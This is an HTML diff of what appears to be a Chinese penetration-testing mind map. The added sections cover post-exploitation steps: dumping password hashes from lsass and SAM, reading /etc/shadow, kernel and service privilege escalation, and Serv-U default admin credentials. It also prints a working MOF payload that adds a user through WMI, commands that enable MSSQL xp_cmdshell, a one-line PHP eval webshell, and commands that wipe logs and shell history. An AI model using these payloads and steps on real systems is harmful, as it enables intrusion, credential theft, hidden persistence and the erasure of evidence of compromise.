@@ -178,6 +178,33 @@
 <li>1.1.3系统操作<ul>
 <li>set  #查看系统的环境变量<br>systeminfo  #查看当前操作系统信息，关注【补丁号】！！！！<br>tasklist #查看进程名称以及PID号<br>net start #查看服务</li>
 <li>软件安装信息查询<br>dir /a “c:\program files” #查看当前系统的安装的软件<br>dir /a “c:\program files (x86)”</li>
+<li>收集hash<ul>
+<li>wce<ul>
+<li>lassa.exe获取</li>
+</ul>
+</li>
+<li>pwdum7<ul>
+<li>lassa.exe获取</li>
+</ul>
+</li>
+<li>mimikatz<ul>
+<li>lassa.exe获取</li>
+</ul>
+</li>
+<li>QuarksPwDump<ul>
+<li>lassa.exe获取</li>
+</ul>
+</li>
+<li>getpass<ul>
+<li>SAM/system获取</li>
+</ul>
+</li>
+<li>SAMinside<ul>
+<li>SAM/system获取</li>
+</ul>
+</li>
+</ul>
+</li>
 </ul>
 </li>
 <li>1.1.4主动搜集<ul>
@@ -186,13 +213,13 @@
 set "FileName=password.txt"
 echo searching..
 for %%a in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-  if exist %%a:\ (
-      for /f "delims=" %%b in ('dir /a-d /s /b "%%a:\*%FileName%" 2^>nul') do (
-          if /i "%%~nxb" equ "%FileName%" (
-              echo,%%b
-              )
-          )
-      )
+if exist %%a:\ (
+for /f "delims=" %%b in ('dir /a-d /s /b "%%a:\*%FileName%" 2^>nul') do (
+if /i "%%~nxb" equ "%FileName%" (
+  echo,%%b
+)
+)
+)
 )</pre></li>
 </ul>
 </li>
@@ -241,13 +268,149 @@ pause</pre></li>
 </ul>
 </li>
 </ul>
-<h3 id="1-2-linux"><a href="#1-2-linux" class="headerlink" title="1.2.linux"></a>1.2.linux</h3><h3 id="1-3第三方"><a href="#1-3第三方" class="headerlink" title="1.3第三方"></a>1.3第三方</h3><ul>
+<h3 id="1-2-linux"><a href="#1-2-linux" class="headerlink" title="1.2.linux"></a>1.2.linux</h3><ul>
+<li>ifconfig<br>route #查看路由<br>whoami #<br>id #查看当前用户id<br>id test #查看test用户信息<br>w #查看当前系统活动用户<br>lastlog #查看用户登陆日志<br>grep MemTotal /proc/meminfo #查看系统内存总量</li>
+<li>cat /etc/passwd #查看用户列表<br>cat /etc/shadow #获取用户hash<br>cat /etc/group #查看用户组<br>grep -v -E “^#” /etc/passwd | awk -F: ‘$3 == 0 { print $1}’   # 列出超级用户<br>awk -F: ‘($3 == “0”) {print}’ /etc/passwd   #列出超级用户</li>
+<li>netstat –an<br>netstat -antlp #查看tcp连接</li>
+<li>系统类型和内核版本<br>cat /etc/issue  #查看系统名称<br>cat /etc/lsb-release #查看系统名称、版本号<br>uname -a #查看内核信息<br>ls /root |grep vmlinuz #查看内核信息</li>
+<li>进程信息<br>ps aux #查看进程信息<br>ps -ef</li>
+<li>安装的软件包和服务<br>dpkg -l #查看安装的软件包<br>rpm -qa #查看安装的软件包<br>cat /etc/service #查看系统存在的服务</li>
+<li>用户登录信息<br>/var/log/wtmp<br>/var/log/btmp</li>
+<li>服务配置<br>cat /etc/syslog.conf<br>cat /etc/chttp.conf<br>cat /etc/lighttpd.conf<br>cat /etc/cups/cupsd.conf<br>cat /etc/inetd.conf<br>cat /etc/apache2/apache2.conf<br>cat /etc/my.conf<br>cat /etc/httpd/conf/httpd.conf<br>cat /opt/lampp/etc/httpd.conf</li>
+<li>网络配置<br>cat /etc/network/interfaces #网卡配置<br>cat /etc/resolv.conf #dns配置<br>hostname #查看主机名</li>
+<li>网络拓扑收集<br>arp –a</li>
+<li>日志信息收集<br>/var/log/*<ul>
+<li>http日志<br>/var/log/apache2/access.log</li>
+<li>mysql日志<br>/var/log/mysql/error.log</li>
+<li>apt日志<br>/var/log/apt/history.log</li>
+</ul>
+</li>
+<li>/home目录文件信息收集</li>
+</ul>
+<h3 id="1-3第三方"><a href="#1-3第三方" class="headerlink" title="1.3第三方"></a>1.3第三方</h3><ul>
 <li>ssh</li>
 <li>ftp</li>
 <li>mail</li>
 <li>mysql</li>
+<li>mssql</li>
 </ul>
-<h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h2 id="3-权限维持"><a href="#3-权限维持" class="headerlink" title="3.权限维持"></a>3.权限维持</h2><h2 id="4-隐匿攻击"><a href="#4-隐匿攻击" class="headerlink" title="4.隐匿攻击"></a>4.隐匿攻击</h2><h2 id="5-横向移动"><a href="#5-横向移动" class="headerlink" title="5.横向移动"></a>5.横向移动</h2><h2 id="6-域渗透"><a href="#6-域渗透" class="headerlink" title="6.域渗透"></a>6.域渗透</h2><h2 id="7-痕迹清理"><a href="#7-痕迹清理" class="headerlink" title="7.痕迹清理"></a>7.痕迹清理</h2>
+<h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
+<li>系统漏洞，ms系列<ul>
+<li>ms08-067<ul>
+<li>rpc</li>
+</ul>
+</li>
+<li>ms09-012<ul>
+<li>pr.exe/巴西烤肉提权</li>
+</ul>
+</li>
+<li>ms09-020<ul>
+<li>iis5/6</li>
+</ul>
+</li>
+<li>ms12-020<ul>
+<li>rdp蓝屏</li>
+</ul>
+</li>
+<li>ms17-010<ul>
+<li>永恒之蓝/wannacry</li>
+</ul>
+</li>
+<li>cve-2019-0708<ul>
+<li>rdp/命令执行</li>
+</ul>
+</li>
+<li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></li>
+<li><a href="https://docs.microsoft.com/zh-cn/security-updates/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/</a></li>
+</ul>
+</li>
+<li>应用程序<ul>
+<li>pcanywhere</li>
+<li>serv-U<ul>
+<li>默认本地管理端口是：43958，默认管理员：LocalAdministrator，默认密码：#l@$ak#.lk;0@P</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul>
+<li>内核提权<ul>
+<li>脏牛漏洞<ul>
+<li>内核版本&gt;2.6</li>
+</ul>
+</li>
+<li><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="服务提权"><a href="#服务提权" class="headerlink" title="服务提权"></a>服务提权</h3><ul>
+<li>mysql<ul>
+<li>UDF提权<ul>
+<li>windows<ul>
+<li>UDF<ul>
+<li>mysql版本 &lt; 5.1 , UDF导出到系统目录c:/windows/system32/</li>
+<li>mysql版本 &gt; 5.1 ，UDF导出到安装路径MySQL\Lib\Plugin\</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>linux<ul>
+<li>/usr/lib/mysql/plugin/</li>
+</ul>
+</li>
+<li>要求有写权限，单引号未被过滤</li>
+</ul>
+</li>
+<li>MOF<ul>
+<li>windows专属<ul>
+<li>流程：<br>1、 首先找个可写的目录，将我们的MOF文件上传上去。<br>2、 执行以下sql语句，mof文件内的命令便会执行。<br>select load_file(‘C:/wmpub/nullevt.mof’) into dumpfile ‘c:/windows/system32/wbem/mof/nullevt.mof’</li>
+<li>mofcomp.exe xxxxx.mof 执行mof文件</li>
+<li>调用Imofcompiler接口的$complieFile方法</li>
+<li>#pragma namespace(“\\.\root\subscription”)<br>instance of __EventFilter as $EventFilter<br>{<br>EventNamespace = “Root\Cimv2”;<br>Name = “filtP2”;<br>Query = “Select * From __InstanceModificationEvent “<br>“Where TargetInstance Isa \”Win32_LocalTime\” “<br>“And TargetInstance.Second = 5”;<br>QueryLanguage = “WQL”;<br>};<br>instance of ActiveScriptEventConsumer as $Consumer<br>{<br>Name = “consPCSV2”;<br>ScriptingEngine = “JScript”;<br>ScriptText =<br>“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user secist 123 /add\”)“;<br>};<br>instance of __FilterToConsumerBinding<br>{<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>};</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>mssql<ul>
+<li>xp_cmdshell<ul>
+<li>开启：<br>EXEC sp_configure ‘show advanced options’, 1;<br>RECONFIGURE;<br>EXEC sp_configure ‘xp_cmdshell’, 1;<br>RECONFIGURE;</li>
+<li>exec xp_cmdshell  ‘net user test test /add’</li>
+</ul>
+</li>
+<li>xp_regwrite</li>
+<li>xp_regread</li>
+</ul>
+</li>
+<li>tomcat<ul>
+<li>弱口令爆破</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-权限维持"><a href="#3-权限维持" class="headerlink" title="3.权限维持"></a>3.权限维持</h2><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3><ul>
+<li>cmd命令<ul>
+<li>写webshell<ul>
+<li>1.使用cmd命令写webshell，带有&lt;&gt;以及“空格”的时候，需要使用^进行转义<br>例如：echo ^&lt;?php^ eval($_POST[a]);?^&gt; &gt; shell.php</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="linux-1"><a href="#linux-1" class="headerlink" title="linux"></a>linux</h3><h3 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h3><ul>
+<li>生成后门<ul>
+<li>以管理员方式运行</li>
+</ul>
+</li>
+</ul>
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><h2 id="4-隐匿攻击"><a href="#4-隐匿攻击" class="headerlink" title="4.隐匿攻击"></a>4.隐匿攻击</h2><h2 id="5-横向移动"><a href="#5-横向移动" class="headerlink" title="5.横向移动"></a>5.横向移动</h2><h2 id="6-域渗透"><a href="#6-域渗透" class="headerlink" title="6.域渗透"></a>6.域渗透</h2><h3 id="瞄准域控-DC机-发起攻击"><a href="#瞄准域控-DC机-发起攻击" class="headerlink" title="瞄准域控(DC机)发起攻击"></a>瞄准域控(DC机)发起攻击</h3><h2 id="7-痕迹清理"><a href="#7-痕迹清理" class="headerlink" title="7.痕迹清理"></a>7.痕迹清理</h2><h3 id="windows-2"><a href="#windows-2" class="headerlink" title="windows"></a>windows</h3><h3 id="linux-2"><a href="#linux-2" class="headerlink" title="linux"></a>linux</h3><ul>
+<li>/var/log/btmp</li>
+<li>/var/log/wtmp</li>
+<li>~/.bash_history</li>
+<li>history -c</li>
+</ul>
+<p><em>XMind: ZEN - Trial Version</em></p>
+
       
 
       
